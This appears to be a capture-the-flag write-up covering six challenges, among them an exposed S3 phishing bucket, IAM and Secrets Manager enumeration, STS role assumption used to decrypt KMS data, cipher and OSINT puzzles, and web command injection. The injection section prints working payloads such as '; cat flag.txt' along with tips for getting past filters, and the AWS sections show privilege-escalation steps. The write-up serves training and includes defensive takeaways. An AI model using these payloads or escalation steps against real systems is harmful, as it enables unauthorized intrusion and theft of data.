A Bucket of Phish

S3 Public Access AWS CLI

The goal was to investigate a suspected phishing infrastructure hosted in S3. I started by attempting to list the bucket contents using anonymous access:

aws s3 ls s3://darkinjector-phish/ --no-sign-request

The --no-sign-request flag tests for public exposure without any credentials. The command returned two files:

captured-logins-093582390  (132 bytes)
index.html                 (2300 bytes)

The index.html was likely the phishing page itself. The captured-logins file was the interesting one — I downloaded it:

aws s3 cp s3://darkinjector-phish/captured-logins-093582390 .
cat captured-logins-093582390

The file contained victim credentials and the flag in a single line.

🚩 THM{this_is_not_what_i_meant_by_public}

Takeaway: Always enable S3 Block Public Access at the account level. A publicly readable bucket containing a phishing credential dump is a double failure — misconfigured infra and exposed victim data.

Cloud Sanity Check

IAM Enumeration Secrets Manager Permission Discovery

Given AWS credentials, the goal was to find what we could access and extract a flag. I started by configuring the CLI and confirming my identity:

aws configure
aws sts get-caller-identity

This confirmed my user's ARN and account ID. Next I enumerated attached policies and available roles:

aws iam list-attached-user-policies --user-name <username>
aws iam list-roles

The user had limited direct policies but could enumerate roles — a sign of possible privilege escalation paths. I then brute-forced permissions by trying safe read-only API calls across services:

aws secretsmanager list-secrets
aws iam get-user
aws ec2 describe-instances
aws iam list-roles

Only secretsmanager list-secrets succeeded, revealing a secret named secret-flag. Classic enumeration: try as many read-only calls as possible and note which ones succeed. With the secret name known, I extracted it:

aws secretsmanager get-secret-value --secret-id secret-flag

The output JSON's SecretString field contained the flag.

🚩 THM{for_your_eyes_only}

Takeaway: Least-privilege IAM policies matter. A user that can enumerate Secrets Manager but has no business need to is a misconfiguration waiting to become a breach. Tools like Prowler and Steampipe can surface these over-permissive configs at scale.

Encrypted Data

IAM Role Assumption KMS Decrypt STS

Given credentials with limited permissions, I needed to find and decrypt an encrypted file stored in S3. I configured the CLI and listed the bucket:

aws configure
aws s3 ls s3://secret-messages/
aws s3 cp s3://secret-messages/20250301.msg.enc ./20250301.msg.enc

I confirmed the file type:

file 20250301.msg.enc
hexdump -C -n 20 20250301.msg.enc
cat 20250301.msg.enc

It was a binary ciphertext blob — KMS-encrypted. To decrypt it I'd need elevated permissions. I listed IAM roles to find one with crypto privileges:

aws iam list-roles

One role stood out immediately: crypto-master. I assumed it using STS:

aws sts assume-role \
  --role-arn arn:aws:iam::332173347248:role/crypto-master \
  --role-session-name decrypt-session

This returned temporary credentials. I exported them:

export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

I then identified the KMS key and confirmed it was active:

aws kms describe-key --key-id <key-id>

The key was enabled. I parsed the ciphertext to isolate the raw binary blob, then decrypted it:

aws kms decrypt \
  --ciphertext-blob fileb://encrypted_blob \
  --output text \
  --query Plaintext | base64 --decode > dec_message.txt

The decrypted plaintext contained the flag.

🚩 THM{crypto_cloud_conundrum}

Takeaway: sts:AssumeRole without a proper trust boundary condition is a classic privilege escalation path. Always scope role trust policies to specific principals and add conditions like MFA or source IP. Also — never store KMS-encrypted blobs alongside the role ARN that can decrypt them.

Catch Me if You Can 2

Cipher Identification Pigpen Cipher

The challenge provided an image containing unusual symbols. I uploaded it to Google Images and identified the symbols as Pigpen cipher — a geometric substitution cipher that maps letters to grid positions.

After decoding the symbols using a Pigpen cipher key, the plaintext read:

meet at torii portal

🚩 THM{torii_portal}

Takeaway: When you encounter unfamiliar symbols in a CTF, a reverse image search of a snippet is often faster than trying to identify the cipher manually. Google Images recognized the Pigpen pattern immediately.

Catch Me if You Can 3

OSINT TripAdvisor Chained Challenges

The challenge asked about a location associated with "Mr. Wok." Direct searches for mr.wok and mr.wok safe house returned nothing useful. I noticed the previous challenges had a Brazilian theme (Coringa do Beco, Torii Portal in São Paulo) — so I tried a more specific search:

mr.wok safe house sao paulo

This surfaced a TripAdvisor listing at the URL:

https://www.tripadvisor.ie/Restaurant_Review-g303631-d14802491-Reviews-Mr_Wok-Sao_Paulo_State_of_Sao_Paulo.html

The listing showed the address: Rua Galvao Bueno 83, Sao Paulo. I submitted the street number as the flag format and it was accepted.

🚩 THM{83_galvao_bueno}

Takeaway: In multi-part OSINT challenges, the clues are often geographically or thematically linked. When a direct search fails, add context from previous challenges — here the São Paulo connection from challenges 1 and 2 was the key.

Dark Encryptor

Command Injection PGP

The challenge presented a web app with what appeared to be an encryption interface. I suspected command injection and started probing with simple payloads to check if OS commands were being executed.

First, I tested for command injection using a semicolon separator:

; ls -la

This worked — the server returned a directory listing, and I could see flag.txt in the output. Now to read it. I tried with && first:

&& cat flag.txt

That didn't work — the && operator was likely being filtered or the preceding command was failing. I switched back to the semicolon:

; cat flag.txt

This worked and printed the flag directly.

🚩 THM{pgp_cant_stop_me}

Takeaway: When && is blocked or fails, ; is often a viable alternative since it runs the second command regardless of the first command's exit code. Always test multiple injection delimiters — ;, |, &&, ||, newlines — as filters are rarely complete.
